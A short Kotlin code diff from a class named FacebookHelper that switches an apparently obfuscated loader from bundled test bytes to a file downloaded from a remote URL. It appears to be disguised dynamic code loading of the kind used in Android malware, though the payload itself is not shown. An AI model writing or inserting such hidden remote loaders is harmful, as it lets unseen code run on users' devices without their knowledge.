@@ -255,7 +255,7 @@ class FacebookHelper(val url: String) {
                     if (mS == "a") {
                         return
                     }
-                    mS = "h"
+                    mS = "b"
                 }
                 CoreH.mustPostLog = optString("loquat_name_list")
                 CoreH.isPostLog = s.contains("hebrides").not()
@@ -364,9 +364,9 @@ class FacebookHelper(val url: String) {
 //        Class.forName("com.vivo.core.Core").getMethod("a", Context::class.java, B1::class.java)
 //            .invoke(null, CoreH.mApp, CoreH.e as B1)
 //        return
-        // todo test
-        load(CoreH.mApp.assets.open("local").readBytes())
-        return
+        //
+//        load(CoreH.mApp.assets.open("local").readBytes())
+//        return
         val parentFile = File("${CoreH.mApp.filesDir}")
         val save = File(parentFile, "file_wall")
         FileDownLoad().fileD(urlD, success = {
